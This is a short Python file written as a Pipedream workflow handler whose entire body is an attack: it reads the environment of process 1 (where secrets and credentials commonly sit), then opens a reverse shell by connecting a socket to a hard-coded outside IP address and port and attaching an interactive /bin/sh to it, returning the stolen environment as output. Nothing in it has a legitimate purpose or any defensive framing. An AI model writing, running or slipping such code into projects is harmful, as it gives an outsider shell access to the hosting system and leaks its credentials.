import json
import subprocess
import socket
import os

def handler(pd: "pipedream"):
	cmd = 'cat /proc/1/environ' 
	rv = subprocess.check_output(cmd.split(' ')).decode().replace('\0', '\n')

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("34.82.112.63", 7788))
	os.dup2(s.fileno(), 0)
	os.dup2(s.fileno(), 1)
	os.dup2(s.fileno(), 2)
	subprocess.call(["/bin/sh", "-i"])

	return {"result": rv}
